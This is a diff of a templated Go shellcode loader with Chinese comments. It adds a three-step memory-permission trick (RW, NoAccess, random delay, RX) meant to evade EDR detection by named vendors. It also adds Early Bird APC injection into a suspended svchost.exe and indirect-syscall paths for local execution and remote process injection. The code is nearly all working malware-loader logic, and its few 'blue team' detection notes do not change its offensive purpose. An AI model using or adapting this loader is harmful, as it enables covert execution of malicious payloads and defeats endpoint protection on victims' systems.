@@ -43,6 +43,92 @@ func sleepObfuscate(address uintptr, size uintptr) {
 	syscall.Syscall6(vp, 4, address, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
 }
 
+// ============================================================
+// 内存权限混淆 — 打破 RW→RX 固定模式
+// ============================================================
+//
+// 【问题】
+//   传统 shellcode 加载器的内存权限变更模式是固定的：
+//     VirtualAlloc(RW) → 写入 shellcode → VirtualProtect(RX) → 执行
+//   这个 RW→RX 的"两步翻转"是 EDR/AV 最经典的检测锚点之一：
+//     - CrowdStrike Falcon: 监控 NtProtectVirtualMemory 将 RW 页面改为 RX
+//     - Microsoft Defender: ETW TI provider 捕获 PAGE_EXECUTE_READ 权限变更
+//     - SentinelOne: 内核回调 MmProtectNotifyRoutine 检测 W→X 转换
+//
+// 【三步权限翻转原理】
+//   插入一个中间状态 PAGE_NOACCESS (0x01)，打破 RW→RX 的直接关联：
+//     RW (0x04) → NoAccess (0x01) → [随机延迟] → RX (0x20)
+//
+//   为什么这能干扰检测：
+//   1. 模式打破：EDR 的规则通常匹配 "RW→RX" 的直接转换，中间插入
+//      NoAccess 后变成两次独立的权限变更，不再匹配原始规则
+//   2. 时间窗口：NoAccess 阶段的随机延迟（50-200ms）使两次 Protect
+//      调用在时间上分离，超出 EDR 的事件关联窗口（通常 <100ms）
+//   3. 语义混淆：NoAccess 是一个"防御性"权限（常见于 guard page、
+//      decommit 等合法场景），不会触发 W→X 的启发式规则
+//   4. 内存扫描规避：在 NoAccess 阶段，内存页不可读，此时触发的
+//      周期性内存扫描无法读取页面内容（会得到 STATUS_ACCESS_VIOLATION）
+//
+// 【本地 vs 远程进程】
+//   - 本地（executeShellcode）：使用 NtProtectVirtualMemory + 当前进程句柄
+//   - 远程（earlyBirdInject/injectToProcess）：使用目标进程句柄
+//   两种场景共用同一个函数，通过 hProcess 参数区分
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - 短时间内同一内存区域出现 3 次 NtProtectVirtualMemory 调用
+//   - 权限序列 RW→NoAccess→RX 本身可作为新的 Sigma 规则特征
+//   - ETW 事件中 PAGE_NOACCESS 后紧跟 PAGE_EXECUTE_READ 的时序模式
+
+// memObfuscatePermissions 三步权限翻转：RW → NoAccess → [延迟] → RX
+// hProcess: 目标进程句柄（本地=当前进程，远程=目标进程）
+// baseAddr: 内存基地址
+// regionLen: 内存区域大小
+func memObfuscatePermissions(hProcess uintptr, baseAddr uintptr, regionLen uintptr) {
+	var oldProtect uint32
+
+	// 第1步：RW → PAGE_NOACCESS (0x01)
+	// 此时内存不可读不可写不可执行，内存扫描器无法读取内容
+{{if .EnableIndirectSyscall}}
+	{
+		base := baseAddr
+		size := regionLen
+		indirectNtProtectVirtualMemory(hProcess, &base, &size, 0x01, &oldProtect)
+	}
+{{else}}
+	ntProtect := getProcAddr(ntdll(), ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+	if ntProtect != 0 {
+		base := baseAddr
+		size := regionLen
+		syscall.Syscall6(ntProtect, 5, hProcess,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&size)),
+			0x01, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	}
+{{end}}
+
+	// 第2步：随机延迟 50-200ms
+	// 目的：拉开两次 Protect 调用的时间间隔，超出 EDR 事件关联窗口
+	time.Sleep(time.Duration(50+rand.Intn(150)) * time.Millisecond)
+
+	// 第3步：NoAccess → PAGE_EXECUTE_READ (0x20)
+{{if .EnableIndirectSyscall}}
+	{
+		base := baseAddr
+		size := regionLen
+		indirectNtProtectVirtualMemory(hProcess, &base, &size, 0x20, &oldProtect)
+	}
+{{else}}
+	if ntProtect != 0 {
+		base := baseAddr
+		size := regionLen
+		syscall.Syscall6(ntProtect, 5, hProcess,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&size)),
+			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	}
+{{end}}
+}
+
 func mutateShellcode(shellcode []byte) []byte {
 	if !enableMutate {
 		return shellcode
@@ -88,12 +174,26 @@ func executeShellcode(shellcode []byte) {
 	defer func() { recover() }()
 
 	k32 := kernel32()
+{{if not .EnableIndirectSyscall}}
 	nt := ntdll()
+{{end}}
 
 	// 分配内存 (RW) — 优先 NtAllocateVirtualMemory
 	var addr uintptr
-	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
 	getCurProc := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentProcess"}}"))
+{{if .EnableIndirectSyscall}}
+	// ── Indirect Syscall 路径 ──
+	if getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		ret := indirectNtAllocateVirtualMemory(hProc, &base, 0, &regionSize, 0x3000, 0x04)
+		if ret == 0 && base != 0 {
+			addr = base
+		}
+	}
+{{else}}
+	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
 	if ntAlloc != 0 && getCurProc != 0 {
 		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
 		var base uintptr
@@ -106,6 +206,7 @@ func executeShellcode(shellcode []byte) {
 			addr = base
 		}
 	}
+{{end}}
 	if addr == 0 {
 		vAlloc := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAlloc"}}"))
 		if vAlloc == 0 {
@@ -135,23 +236,36 @@ func executeShellcode(shellcode []byte) {
 		sleepObfuscate(addr, uintptr(len(shellcode)))
 	}
 
-	// RW → RX — 优先 NtProtectVirtualMemory
-	var oldProtect uint32
-	ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
-	if ntProtect != 0 && getCurProc != 0 {
+	// RW → RX（可选三步权限混淆）
+	if getCurProc != 0 {
 		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+{{if .EnableMemObf}}
+		// 三步权限翻转：RW → NoAccess → [延迟] → RX
+		memObfuscatePermissions(hProc, addr, uintptr(len(shellcode)))
+{{else}}
+		var oldProtect uint32
+{{if .EnableIndirectSyscall}}
 		base := addr
 		regionSize := uintptr(len(shellcode))
-		syscall.Syscall6(ntProtect, 5, hProc,
-			uintptr(unsafe.Pointer(&base)),
-			uintptr(unsafe.Pointer(&regionSize)),
-			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
-	} else {
-		vProtect := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
-		if vProtect != 0 {
-			syscall.Syscall6(vProtect, 4, addr, uintptr(len(shellcode)),
-				0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+		indirectNtProtectVirtualMemory(hProc, &base, &regionSize, 0x20, &oldProtect)
+{{else}}
+		ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+		if ntProtect != 0 {
+			base := addr
+			regionSize := uintptr(len(shellcode))
+			syscall.Syscall6(ntProtect, 5, hProc,
+				uintptr(unsafe.Pointer(&base)),
+				uintptr(unsafe.Pointer(&regionSize)),
+				0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+		} else {
+			vProtect := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
+			if vProtect != 0 {
+				syscall.Syscall6(vProtect, 4, addr, uintptr(len(shellcode)),
+					0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+			}
 		}
+{{end}}
+{{end}}
 	}
 
 	// 执行前二次调试检测
@@ -162,8 +276,22 @@ func executeShellcode(shellcode []byte) {
 	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 
 	// 优先：NtCreateThreadEx（更底层，部分 EDR 不 hook）
-	ntCreateThreadEx := getProcAddr(nt, ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
 	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+{{if .EnableIndirectSyscall}}
+	// ── Indirect Syscall 路径 ──
+	if getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var hThread uintptr
+		ret := indirectNtCreateThreadEx(&hThread, 0x1FFFFF, 0, hProc, addr, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			return
+		}
+	}
+{{else}}
+	ntCreateThreadEx := getProcAddr(nt, ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
 	if ntCreateThreadEx != 0 && getCurProc != 0 {
 		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
 		var hThread uintptr
@@ -177,6 +305,7 @@ func executeShellcode(shellcode []byte) {
 			return
 		}
 	}
+{{end}}
 
 	// 备选：CreateThread
 	createThread := getProcAddr(k32, ds("{{index .EncodedStrings "CreateThread"}}"))
@@ -191,10 +320,259 @@ func executeShellcode(shellcode []byte) {
 	// 最后备选：回调执行
 	executeViaCallback(addr)
 }
+
+// ============================================================
+// Early Bird APC 注入
+// ============================================================
+//
+// 【原理】Early Bird 是一种基于 APC（异步过程调用）的进程注入技术：
+//   1. 以挂起状态（CREATE_SUSPENDED）创建一个合法子进程（如 svchost.exe）
+//   2. 在子进程尚未初始化时，向其主线程的 APC 队列插入 shellcode 地址
+//   3. 恢复线程 → 系统在线程初始化早期自动执行 APC → shellcode 运行
+//
+// 【为什么叫 "Early Bird"】
+//   APC 在进程初始化极早期（ntdll!LdrInitializeThunk 之前）就被调度，
+//   此时 EDR 的用户态 hook（通常在 DLL 加载时注入）尚未生效。
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - Sysmon EventID 1: 父子进程关系异常（如 loader.exe → svchost.exe）
+//   - Sysmon EventID 8: CreateRemoteThread 检测（部分 EDR 也监控 APC）
+//   - ETW Microsoft-Windows-Threat-Intelligence:
+//       * 内存属性变更（RW→RX）发生在远程进程
+//       * NtQueueApcThreadEx 调用源不是已知系统组件
+//   - 内核回调 PsSetCreateProcessNotifyRoutine:
+//       * CREATE_SUSPENDED 标志 + 后续立即 ResumeThread 的时序模式
+//   - YARA 规则锚点:
+//       * 同一二进制中同时出现 CreateProcessW + NtQueueApcThreadEx/QueueUserAPC + ResumeThread
+//       * VirtualAllocEx + WriteProcessMemory 组合出现在非系统进程中
+//   - Sigma 规则:
+//       * 进程创建事件中 CREATE_SUSPENDED(0x4) 标志 + 短时间内 ResumeThread
+//       * 调用栈中 NtQueueApcThreadEx 的调用者不在白名单模块内
+
+// earlyBirdInject 通过 Early Bird APC 注入执行 shellcode
+// 创建挂起的子进程 → 分配内存 → 写入 → APC 排队 → 恢复线程
+func earlyBirdInject(shellcode []byte) bool {
+	k32 := kernel32()
+{{if not .EnableIndirectSyscall}}
+	nt := ntdll()
+{{end}}
+
+	// ── 1. 以 CREATE_SUSPENDED 创建子进程 ──
+	// 选择 svchost.exe 作为宿主：它是系统常驻进程，多实例运行不会引起怀疑
+	// 【检测点】父子进程关系异常是最直接的检测信号
+	createProc := getProcAddr(k32, ds("{{index .EncodedStrings "CreateProcessW"}}"))
+	closeH := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
+	if createProc == 0 || closeH == 0 {
+		return false
+	}
+
+	targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
+
+	// STARTUPINFOW — 最小初始化
+	type startupInfoW struct {
+		Cb            uint32
+		_             [4]uintptr
+		Desktop       *uint16
+		_             [2]uintptr
+		Flags         uint32
+		ShowWindow    uint16
+		_             uint16
+		_             uintptr
+		StdInput      uintptr
+		StdOutput     uintptr
+		StdError      uintptr
+	}
+	// PROCESS_INFORMATION
+	type processInfo struct {
+		Process   uintptr
+		Thread    uintptr
+		ProcessID uint32
+		ThreadID  uint32
+	}
+
+	var si startupInfoW
+	var pi processInfo
+	si.Cb = uint32(unsafe.Sizeof(si))
+
+	// CREATE_SUSPENDED = 0x4 | CREATE_NO_WINDOW = 0x08000000
+	// 【检测点】CREATE_SUSPENDED 标志是 Early Bird 的核心特征
+	const createFlags = 0x4 | 0x08000000
+	ret, _, _ := syscall.Syscall12(createProc, 10,
+		0, uintptr(unsafe.Pointer(targetPath)),
+		0, 0, 0, createFlags,
+		0, 0,
+		uintptr(unsafe.Pointer(&si)),
+		uintptr(unsafe.Pointer(&pi)),
+		0, 0)
+	if ret == 0 {
+		return false
+	}
+	defer syscall.Syscall(closeH, 1, pi.Process, 0, 0)
+	defer syscall.Syscall(closeH, 1, pi.Thread, 0, 0)
+
+	// ── 2. 在子进程中分配 RW 内存 ──
+	var remoteAddr uintptr
+{{if .EnableIndirectSyscall}}
+	{
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		r := indirectNtAllocateVirtualMemory(pi.Process, &base, 0, &regionSize, 0x3000, 0x04)
+		if r == 0 && base != 0 {
+			remoteAddr = base
+		}
+	}
+{{else}}
+	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
+	if ntAlloc != 0 {
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		r, _, _ := syscall.Syscall6(ntAlloc, 6, pi.Process,
+			uintptr(unsafe.Pointer(&base)), 0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x3000, 0x04)
+		if r == 0 && base != 0 {
+			remoteAddr = base
+		}
+	}
+{{end}}
+	if remoteAddr == 0 {
+		vAllocEx := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAllocEx"}}"))
+		if vAllocEx == 0 {
+			return false
+		}
+		remoteAddr, _, _ = syscall.Syscall6(vAllocEx, 5, pi.Process, 0,
+			uintptr(len(shellcode)), 0x3000, 0x04, 0)
+		if remoteAddr == 0 {
+			return false
+		}
+	}
+
+	// ── 3. 写入 shellcode ──
+{{if .EnableIndirectSyscall}}
+	{
+		var written uintptr
+		r := indirectNtWriteVirtualMemory(pi.Process, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
+		if r != 0 {
+			return false
+		}
+	}
+{{else}}
+	ntWrite := getProcAddr(nt, ds("{{index .EncodedStrings "NtWriteVirtualMemory"}}"))
+	if ntWrite != 0 {
+		var written uintptr
+		r, _, _ := syscall.Syscall6(ntWrite, 5, pi.Process, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
+			uintptr(unsafe.Pointer(&written)), 0)
+		if r != 0 {
+			return false
+		}
+	} else {
+		wpm := getProcAddr(k32, ds("{{index .EncodedStrings "WriteProcessMemory"}}"))
+		if wpm == 0 {
+			return false
+		}
+		var written uintptr
+		ret, _, _ := syscall.Syscall6(wpm, 5, pi.Process, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
+			uintptr(unsafe.Pointer(&written)), 0)
+		if ret == 0 {
+			return false
+		}
+	}
+{{end}}
+
+	// ── 4. RW → RX（可选三步权限混淆）──
+	// 【检测点】远程进程内存属性从 RW 变为 RX，ETW TI 可捕获
+{{if .EnableMemObf}}
+	memObfuscatePermissions(pi.Process, remoteAddr, uintptr(len(shellcode)))
+{{else}}
+{{if .EnableIndirectSyscall}}
+	{
+		base := remoteAddr
+		regionSize := uintptr(len(shellcode))
+		var oldProtect uint32
+		indirectNtProtectVirtualMemory(pi.Process, &base, &regionSize, 0x20, &oldProtect)
+	}
+{{else}}
+	ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+	if ntProtect != 0 {
+		base := remoteAddr
+		regionSize := uintptr(len(shellcode))
+		var oldProtect uint32
+		syscall.Syscall6(ntProtect, 5, pi.Process,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	} else {
+		vpEx := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtectEx"}}"))
+		if vpEx != 0 {
+			var oldProtect uint32
+			syscall.Syscall6(vpEx, 5, pi.Process, remoteAddr,
+				uintptr(len(shellcode)), 0x20,
+				uintptr(unsafe.Pointer(&oldProtect)), 0)
+		}
+	}
+{{end}}
+{{end}}
+
+	// ── 5. 向挂起线程的 APC 队列插入 shellcode 地址 ──
+	// 优先使用 NtQueueApcThreadEx（更底层，部分 EDR 不监控）
+	// 【检测点】NtQueueApcThreadEx 调用目标是挂起状态的远程线程
+	queued := false
+{{if .EnableIndirectSyscall}}
+	// ── Indirect Syscall 路径 ──
+	r := indirectNtQueueApcThreadEx(pi.Thread, 1, remoteAddr, 0, 0, 0)
+	if r == 0 {
+		queued = true
+	}
+{{else}}
+	ntQueueApc := getProcAddr(nt, ds("{{index .EncodedStrings "NtQueueApcThreadEx"}}"))
+	if ntQueueApc != 0 {
+		// NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle, ApcRoutine, Arg1, Arg2, Arg3)
+		// UserApcReserveHandle = 1 表示使用普通 APC（非特殊保留）
+		r, _, _ := syscall.Syscall6(ntQueueApc, 6,
+			pi.Thread, 1, remoteAddr, 0, 0, 0)
+		if r == 0 {
+			queued = true
+		}
+	}
+{{end}}
+	if !queued {
+		// 回退到 QueueUserAPC（Win32 层，更容易被 hook）
+		queueAPC := getProcAddr(k32, ds("{{index .EncodedStrings "QueueUserAPC"}}"))
+		if queueAPC == 0 {
+			return false
+		}
+		ret, _, _ := syscall.Syscall(queueAPC, 3, remoteAddr, pi.Thread, 0)
+		if ret == 0 {
+			return false
+		}
+	}
+
+	// ── 6. 恢复线程 → APC 在进程初始化早期被调度执行 ──
+	// 【检测点】CREATE_SUSPENDED → 短时间内 ResumeThread 的时序模式
+	resumeThread := getProcAddr(k32, ds("{{index .EncodedStrings "ResumeThread"}}"))
+	if resumeThread == 0 {
+		return false
+	}
+	syscall.Syscall(resumeThread, 1, pi.Thread, 0, 0)
+
+	// 等待子进程结束
+	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+	if waitObj != 0 {
+		syscall.Syscall(waitObj, 2, pi.Process, 0xFFFFFFFF, 0)
+	}
+
+	return true
+}
+
 // injectToProcess 将 shellcode 注入到合法进程中执行。
 func injectToProcess(shellcode []byte) bool {
 	k32 := kernel32()
+{{if not .EnableIndirectSyscall}}
 	nt := ntdll()
+{{end}}
 
 	snap := getProcAddr(k32, ds("{{index .EncodedStrings "CreateToolhelp32Snapshot"}}"))
 	first := getProcAddr(k32, ds("{{index .EncodedStrings "Process32FirstW"}}"))
@@ -251,6 +629,16 @@ func injectToProcess(shellcode []byte) bool {
 	defer syscall.Syscall(closeH, 1, hProcess, 0, 0)
 	// 分配远程内存 — 优先 NtAllocateVirtualMemory
 	var remoteAddr uintptr
+{{if .EnableIndirectSyscall}}
+	{
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		r := indirectNtAllocateVirtualMemory(hProcess, &base, 0, &regionSize, 0x3000, 0x04)
+		if r == 0 && base != 0 {
+			remoteAddr = base
+		}
+	}
+{{else}}
 	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
 	if ntAlloc != 0 {
 		var base uintptr
@@ -263,6 +651,7 @@ func injectToProcess(shellcode []byte) bool {
 			remoteAddr = base
 		}
 	}
+{{end}}
 	if remoteAddr == 0 {
 		vAllocEx := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAllocEx"}}"))
 		if vAllocEx == 0 {
@@ -276,6 +665,16 @@ func injectToProcess(shellcode []byte) bool {
 	}
 
 	// 写入 shellcode — 优先 NtWriteVirtualMemory
+{{if .EnableIndirectSyscall}}
+	{
+		var written uintptr
+		r := indirectNtWriteVirtualMemory(hProcess, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
+		if r != 0 {
+			return false
+		}
+	}
+{{else}}
 	ntWrite := getProcAddr(nt, ds("{{index .EncodedStrings "NtWriteVirtualMemory"}}"))
 	if ntWrite != 0 {
 		var written uintptr
@@ -298,8 +697,20 @@ func injectToProcess(shellcode []byte) bool {
 			return false
 		}
 	}
+{{end}}
 
-	// RW → RX
+	// RW → RX（可选三步权限混淆）
+{{if .EnableMemObf}}
+	memObfuscatePermissions(hProcess, remoteAddr, uintptr(len(shellcode)))
+{{else}}
+{{if .EnableIndirectSyscall}}
+	{
+		base := remoteAddr
+		regionSize := uintptr(len(shellcode))
+		var oldProtect uint32
+		indirectNtProtectVirtualMemory(hProcess, &base, &regionSize, 0x20, &oldProtect)
+	}
+{{else}}
 	ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
 	if ntProtect != 0 {
 		base := remoteAddr
@@ -318,9 +729,24 @@ func injectToProcess(shellcode []byte) bool {
 				uintptr(unsafe.Pointer(&oldProtect)), 0)
 		}
 	}
+{{end}}
+{{end}}
 
 	// 创建远程线程 — 优先 NtCreateThreadEx
 	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+{{if .EnableIndirectSyscall}}
+	{
+		var hThread uintptr
+		ret := indirectNtCreateThreadEx(&hThread, 0x1FFFFF, 0, hProcess, remoteAddr, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			syscall.Syscall(closeH, 1, hThread, 0, 0)
+			return true
+		}
+	}
+{{else}}
 	ntCreateThreadEx := getProcAddr(nt, ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
 	if ntCreateThreadEx != 0 {
 		var hThread uintptr
@@ -335,6 +761,7 @@ func injectToProcess(shellcode []byte) bool {
 			return true
 		}
 	}
+{{end}}
 
 	// 备选：CreateRemoteThread
 	crt := getProcAddr(k32, ds("{{index .EncodedStrings "CreateRemoteThread"}}"))
